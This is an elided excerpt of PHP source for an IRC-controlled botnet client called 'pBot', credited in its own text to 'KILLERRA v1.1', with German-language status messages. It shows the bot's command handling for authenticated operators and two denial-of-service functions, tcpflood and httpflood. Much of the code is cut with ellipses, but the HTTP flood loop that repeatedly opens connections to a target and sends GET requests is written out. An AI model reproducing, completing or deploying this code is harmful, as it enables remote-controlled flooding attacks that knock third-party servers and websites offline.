	...
	class pBot {
							...
							case "PRIVMSG":
								if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == "*")) {
									...
									if(substr($mcmd[0],0,1)==".") {
										...
										case "info":
											$this->privmsg($this->config['chan'],"[Server Information] No Infos sorry :( .");
											break;
											
										case "bot":
											$this->privmsg($this->config['chan'],"[Bot Information] Bot by KILLERRA v1.1");
											break;
										...
										case "die":
											$this->send("QUIT :$nick hat mich getötet");
											fclose($this->conn);
											exit;
		...
		function tcpflood($host, $port, $size, $time) {
			if(isset($host) AND isset($port) AND isset($size) AND isset($time)) {
				...
				$this->privmsg($this->config['chan'], "[TcpFlood] Kloppt $host auf Port $port mit $size Byte Paketen für $time sekunden an.");
				$endtime = time() + $time;
				...
				$this->privmsg($this->config['chan'], "[TcpFlood] Erfolgreicher Angriff auf $host auf Port $port mit $size Byte Paketen für $time sekunden.");
				return true;
			}
			return false;
		}
		...
		function httpflood($url, $path, $time) {
			if(isset($url) AND isset($path) AND isset($time)) {
				...
				$this->privmsg($this->config['chan'], "[HttpFlood] Kloppt $url/$path für $time Sekunden.");
				while(time() < $endtime) {
					$fp = fsockopen($url, 80, $errno, $errstr, 1);
					if($fp) {
						$out = "GET /".$path." HTTP/1.1\r\n";
						$out .= "url: ".$url."\r\n";
						$out .= "Keep-Alive: 12000\r\n";
				...
				$this->privmsg($this->config['chan'], "[HttpFlood] Angriff Erfolgreich auf $url/$path für $time Sekunden.");
				return true;
			}
			return false;
		}
